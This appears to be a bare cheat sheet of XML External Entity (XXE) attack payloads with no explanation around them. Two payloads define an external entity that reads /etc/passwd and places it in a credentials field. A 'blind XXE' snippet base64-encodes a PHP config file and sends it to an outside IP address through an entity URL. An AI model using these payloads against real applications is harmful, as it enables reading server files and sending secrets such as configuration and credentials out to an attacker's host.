```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY NyaMeeEain SYSTEM "file:///etc/passwd" >]>
<creds><user>&NyaMeeEain;</user><pass>mypass</pass></creds>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY NyaMeeEain SYSTEM "file:///etc/passwd" >]>
<creds><user>&NyaMeeEain;</user><pass>mypass</pass></creds>

```

# blind XXE
```
<!ENTITY % MeMe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> 
<!ENTITY % NyaMeeEain "<!ENTITY exfil SYSTEM 'http://54.14.109.223:775/dtd.xml?%MeMe;'>">
```